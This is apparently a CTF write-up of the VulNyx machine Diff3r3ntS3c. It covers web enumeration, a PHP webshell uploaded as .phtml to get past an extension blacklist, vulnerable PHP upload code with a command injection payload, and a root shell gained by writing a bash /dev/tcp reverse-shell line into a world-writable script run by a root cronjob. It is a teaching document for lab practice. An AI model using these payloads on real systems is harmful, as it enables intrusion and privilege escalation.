---
layout: single
title: VulNyx&#58; Diff3r3ntS3c
excerpt: "Writeup of the machine Diff3r3ntS3c from VulNyx."
date: 2024-04-08
classes: wide
header:
  teaser: /assets/images/2024-04-08-vulnyx-diff3r3nts3c/box-info.png
  teaser_home_page: true
  icon:
categories:
  - ctf
tags:  
  - vulnyx
  - nmap
  - web
  - burpsuite
  - arbitrary file upload
  - ffuf
  - directory listing
  - command injection
  - cronjob
---

## Summary 

- [1. Port and service scanning](#section-id-1)
- [2. Gaining access](#section-id-2)
  - [2.1. Detecting the arbitrary file upload](#section-id-2-1)
  - [2.2. Getting a shell as candidate](#section-id-2-2)
  - [2.3. Why does this arbitrary file upload exist?](#section-id-2-3)
- [3. Privilege escalation](#section-id-3)
  - [3.1. Detecting the cronjob vulnerability](#section-id-3-1)
  - [3.2. Getting a shell as root](#section-id-3-2)
  - [3.3. Why does this privilege escalation via cronjob exist?](#section-id-3-3)

<p style="text-align:center;"><img src="/assets/images/2024-03-31-vulnyx-hackingstation/box-info.png" style="width: 750px;"></p>

In this post we are going to see the writeup of the machine Diff3r3ntS3c from [VulNyx](https://vulnyx.com/). It's an easy machine created by [HackCommander](https://hackcommander.github.io/) (yeah, it's me again :blush:) especially designed for beginners. We are going to get access to the machine through an arbitrary file upload in a web form and then to escalate privileges through a cronjob executed as root using a script editable by any user.

<div id='section-id-1'/>
## 1. Port and service scanning

After running a port scan

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nmap -p- -Pn --min-rate 10000 10.0.2.20
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:33 CEST
Nmap scan report for 10.0.2.20
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
```

we can see that the port 80 is open and therefore there is a web. Now running a service scan

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nmap -p 80 -sCV 10.0.2.20
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-07 14:34 CEST
Nmap scan report for 10.0.2.20
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Diff3r3ntS3c

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
```

we can see that there is a webserver *Apache httpd 2.4.57* running on Debian, but before looking for CVEs it is better to take a look at the web.

<div id='section-id-2'/>
## 2. Gaining access

<div id='section-id-2-1'/>
## 2.1. Detecting the arbitrary file upload

Accessing the website, it looks like the website of a cybersecurity company

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/web-index.png)

and if we scroll down we can see that there is an upload form for candidates who want to work in the company

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form.png)

If we try to upload a photo

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/upload-form-picture.png)

we get the following message

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/png-ok-response.png)

It seems that it is not performing any file renaming or any modification on the uploaded file, which is a good sign for us as hackers. Now we should find the directory where the file was uploaded, for which we could use the ffuf tool as follows

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ ffuf -c -w /usr/share/wordlists/OneListForAll/onelistforallmicro.txt -u http://10.0.2.20/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/OneListForAll/onelistforallmicro.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.ht_wsr.txt             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd-old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.httpd.conf             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessbak            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.phps              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
?wsdl                   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 1ms]
.htpasswds              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-dev           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status?full      [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm.bak                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
?view=log               [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.old           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.swp           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.txt           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm.old                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
yesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylongrequesturlbutwearedoingitonpurposewearescanningforresearchpurposepleasehavealookattheuseragentthxyesthisisareallylngrequesturlbutwearedoingitonpurposewearescann [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.html              [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htpasswd_test          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htf                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.httr-oauth             [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 235ms]
.htaccess_extra         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_sc            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.save          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 247ms]
.htaccess.sample        [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_orig          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]
.htusers                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htm                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak1          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
server-status?full&showmodulestate [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-marco         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd.inc           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessold2           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
                        [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
.htpasswrd              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html.bak               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccessold            [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
wp-config.phps          [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-local         [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html.old               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
.htaccess~              [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 0ms]
index.html?findcli=-1   [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 0ms]
uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [26468/26468] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:05] :: Errors: 1 ::
```

As we can see, there is an *uploads* directory. If we visit it we can see that this directory is vulnerable to *directory listing* as we can see listed all the directories and files in the path

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-uploads.png)

If we access directory *1*

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-1.png)

we can see that there are 2 files, a *txt* file with the user's data

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-txt.png)

and the png file that has been uploaded without any renaming or change in the content

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-png.png)

This may mean that the developer was not too careful in coding the file upload, since it is convenient to rename the uploaded files to avoid duplicate filenames and for security. However, sending the file upload request with burpsuite but changing the file extension to *php* we receive the following message

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/php-not-ok-response.png)

So the backend is checking if the file extension is malicious or not. **The question is whether it is using a whitelist or a blacklist of extensions** to perform this check, and depending on that there could be an [arbitrary file upload](https://portswigger.net/web-security/file-upload).

If we go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload) we can see that there are some simple file upload methods that we can check manually before running more complex attacks

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/hacktricks.png)

We could copy all the extensions and send the burpsuite request to the intruder to check if there are any valid extensions. However, if it is using a blacklist of extensions it is quite likely that any of those extensions are valid, so using a random extension such as *phtml*, it throws the following message

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/phtml-ok-response.png)

This means that **we bypassed the file extension check by uploading a file with an extension that also allows the execution of PHP code**.

<div id='section-id-2-2'/>
## 2.2. Getting a shell as candidate

To verify if the backend performs any checks on the file content and if we can execute code, let's try to upload the [pentestmonkey webshell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) with *phtml* extension.

After downloading the webshell, changing the extension to *phtml* and changing the IP to that of my attacking machine as follows

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-conf.png)

it only remains to upload the webshell to the server. It is not necessary to use the burp for this task, and we can do it manually, receiving the following message

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/webshell-ok-response.png)

Now we go to the last directory in the uploads directory and see that the shell was uploaded successfully

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/directory-listing-webshell.png)

After this, setting up a listener on the attacking machine on port 1234

{% include codeHeader.html %}
```console
nc -nlvp 1234
```

and by clicking on the webshell, we receive the shell, and we can execute the following code

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 49956
Linux Diff3r3ntS3c 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
 16:45:30 up  2:22,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
candidate
$ cd /home/candidate
$ ls
user.txt
$
```

where we can see that we got a shell as the *candidate* user and that the user flag is in */home/candidate/user.txt*.

<div id='section-id-2-3'/>
## 2.3. Why does this arbitrary file upload exist?

After opening the script that performs the data upload, we can see the following PHP code

{% include codeHeader.html %}
```php
<?php
    // Get the name and the phone number of the user
    $name=$_POST['name'];
    $phone_number=$_POST['phone_number'];

    // Get the file name and file temporal name
    $file_name = $_FILES['file']['name'];
    $file_tmp_name  = $_FILES['file']['tmp_name'];

    // Create the data upload directory
    $upload_directory='./uploads/';
    $new_directory=count(glob($upload_directory . '/*', GLOB_ONLYDIR)) + 1 . "/";
    $data_upload_directory=$upload_directory . $new_directory;
    mkdir($data_upload_directory);

    // Store the name and the phone number of the user in a txt file
    $user_data="Name: $name\nPhone number: $phone_number";
    $save_user_data_command="echo '$user_data' > $data_upload_directory/userinfo.txt";
    system($save_user_data_command);

    // Set the not allowed file extensions
    $not_allowed_file_extensions = ['sh','php']; // These will be the only file extensions allowed

    // Get the file extension
    $file_extension = strtolower(end(explode('.',$file_name)));

    if (isset($_POST['submit'])) {

        if (in_array($file_extension,$not_allowed_file_extensions)) { // If the file extension is not allowed

            echo "This file looks malicious. Please do not try to hack us.";

        } else { // If the file extension is allowed

            // Try to upload the file
            $file_upload_path = $data_upload_directory . basename($file_name);
            $successful_upload = move_uploaded_file($file_tmp_name, $file_upload_path);

            if ($successful_upload) { // If the upload was successful

                echo "The file " . basename($file_name) . " has been uploaded";

            } else { // If the upload was unsuccessful

                echo "An error occurred. Please contact the administrator.";
            }
        }

    }
?>
```

The code is is very understandable with the comments so it doesn't require much explanation, but the vulnerability is in the following line

```php
// Set the not allowed file extensions
$not_allowed_file_extensions = ['sh','php']; // These will be the only file extensions allowed
```

because **it is using a blacklist of not allowed extensions**. It is only blocking the upload of files with *php* and *sh* extensions but allowing other extensions that are also interpretable by a PHP backend, such as *phtml*. That is why **it is recommended to use a whitelist of allowed extensions and if possible other additional measures such as content checking**.

Additionally, if we scour the code we can identify another critical vulnerability... can you find it?

Here it goes. In the following code, which is the one used to save the user's data in a txt, there is a command injection

```php
// Store the name and the phone number of the user in a txt file
$user_data="Name: $name\nPhone number: $phone_number";
$save_user_data_command="echo '$user_data' > $data_upload_directory/userinfo.txt";
system($save_user_data_command);
```

In this code the *system* function is executed taking as input the user's data without sanitizing. Therefore, sending the following payload

```html
HackCommander';whoami
```

the following response is obtained

![](/assets/images/2024-04-08-vulnyx-diff3r3nts3c/command-injection.png)

The presence of this vulnerability does not affect the difficulty of the machine as this method is more difficult to find and exploit than arbitrary file uploading. This is why the machine remains easy.

<div id='section-id-3'/>
## 3. Privilege escalation

<div id='section-id-3-1'/>
## 3.1. Detecting the cronjob vulnerability

Taking a look at the candidate user's home we can see that there is a hidden directory *.scripts* with a script named *makeBackup.sh*

{% include codeHeader.html %}
```console
$ pwd
/var/www/html
$ cd /home/candidate
$ pwd
/home/candidate
$ ls -la
total 36
drwx------ 5 candidate candidate 4096 Mar 28 10:56 .
drwxr-xr-x 3 root      root      4096 Mar 28 10:11 ..
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:53 .backups
lrwxrwxrwx 1 root      root         9 Nov 15 10:43 .bash_history -> /dev/null
-rw-r--r-- 1 candidate candidate  220 Nov 15 10:23 .bash_logout
-rw-r--r-- 1 candidate candidate 3526 Nov 15 10:23 .bashrc
drwxr-xr-x 3 candidate candidate 4096 Mar 28 10:56 .local
-rw-r--r-- 1 candidate candidate  807 Nov 15 10:23 .profile
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .scripts
-r-------- 1 candidate candidate   33 Mar 28 10:31 user.txt
$ cd .scripts
$ ls -la
total 12
drwxr-xr-x 2 candidate candidate 4096 Mar 28 10:57 .
drwx------ 5 candidate candidate 4096 Mar 28 10:56 ..
-rwxrwxrwx 1 candidate candidate  399 Mar 28 10:57 makeBackup.sh
$ cat makeBackup.sh
#!/bin/bash

# Source folder to be backed up
source_folder="/var/www/html/uploads/"

# Destination folder for the backup
backup_folder="/home/candidate/.backups/"

# Create backup folder if it doesn't exist
mkdir -p "$backup_folder"

# Backup file name
backup_file="${backup_folder}backup.tar.gz"

# Create a compressed tar archive of the source folder
tar -czf "$backup_file" -C "$source_folder" .
```

This script is used to backup the directory */var/www/html/uploads/* (the data uploaded by candidates) and save it to the file */home/candidate/.backups/backup.tar.gz*. Backing up is always a good idea and in this case the sysadmin tries to make sure that the data uploaded by the user is safe. One important thing is that the main characteristic of backups is that they are **periodic** tasks, so it would not be unusual for the machine to have some recurring task configured to run this script. In linux these tasks are called [cronjobs](https://cronitor.io/guides/cron-jobs).

We can check which cronjobs the machine has configured as follows

{% include codeHeader.html %}
```console
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
```

Indeed, there is a line containing a reference to this script

{% include codeHeader.html %}
```console
* * * * * root /bin/sh /home/candidate/Scripts/makeBackup.sh
```

but it is necessary to understand it. The meaning of each one of the elements of the line is

- The first asterisk indicates the minute of each hour in which the task will be executed. In this case, using an asterisk means that it will be executed every minute.
- The second asterisk indicates the hour of the day when the task will be executed. When configured with an asterisk, the task will be executed at all hours.
- The third asterisk indicates the day of the month on which the task will run. Again, when using an asterisk, the task will be executed on all days of the month.
- The fourth asterisk indicates the month in which the task will be executed. When set with an asterisk, the task will be executed in all months.
- The fifth asterisk indicates the day of the week on which the task will be executed. When using an asterisk, the task will be executed on all days of the week (Monday through Sunday).
- The word *root* specifies the user under which the task will be executed.
- The word */bin/sh* is the path to the shell interpreter that will be used to execute the script.
- */home/candidate/.scripts/makeBackup.sh* is the path of the script to be executed during the task.

In a nutshell, **the script */home/candidate/.scripts/makeBackup.sh* is executed every minute by the *root* user**. In this case there is no reason for the cronjob to be executed with the *root* user because all the directories involved are accessible with the *candidate* user. However, it is not uncommon to find this type of configuration due to carelessness and convenience of the sysadmins because the *root* user will never throw a permissions denied.

If we combine this with the fact that, as we saw before, **the *makeBackup.sh* script has read, write and execute permissions for all users**, we are 100% sure that we already have a vector to escalate privileges to *root*.

<div id='section-id-3-2'/>
## 3.2. Getting a shell as root

The strategy now is to execute a shell of the type

{% include codeHeader.html %}
```console
#/bin/bash
bash -c 'bash -i >& /dev/tcp/10.0.2.15/1235 0>&1'
```

Setting up a listener on the attacking machine on port 1235

{% include codeHeader.html %}
```console
nc -nlvp 1235
```

and then executing the following code on the target machine

{% include codeHeader.html %}
```console
$ pwd
/home/candidate/.scripts
$ echo -e "#/bin/bash\nbash -c 'bash -i >& /dev/tcp/10.0.2.15/1235 0>&1'" > makeBackup.sh
$ cat makeBackup.sh
-e #/bin/bash
bash -c 'bash -i >& /dev/tcp/10.0.2.15/1235 0>&1'
```

After a few seconds (at the most you have to wait 1 minute), we receive the *root* shell

{% include codeHeader.html %}
```console
┌──(hackcommander㉿kali)-[~]
└─$ nc -nlvp 1235 
listening on [any] 1235 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.20] 47866
bash: cannot set terminal process group (3479): Inappropriate ioctl for device
bash: no job control in this shell
root@Diff3r3ntS3c:~# whoami
whoami
root
root@Diff3r3ntS3c:~# pwd
pwd
/root
root@Diff3r3ntS3c:~# ls
ls
root.txt
```

and we can see that the root flag is in */root/root.txt*.

<div id='section-id-3-3'/>
## 3.3. Why does this privilege escalation via cronjob exist?

This method worked because 2 conditions were met at the same time:

- The cronjob is executed with the *root* user.
- The script that runs the cronjob is editable by any user.

**Both conditions are necessary to perform this privilege escalation.** To understand it better, let's think what would happen if one of the 2 conditions were not met:

- If the cronjob is not executed as *root* user but for example with the *candidate* user, then even if we could modify the script *makeBackup.sh*, we would get a shell with the *candidate* user.
- If the script that is executed is not editable by any user then there is no way to intervene in the cronjob execution flow, at least by directly editing the script. The only thing we could do is to look for other scripts or functionalities that allow to write in the *makeBackup.sh* script to inject code in the cronjob. This is too specific and does not have to happen.
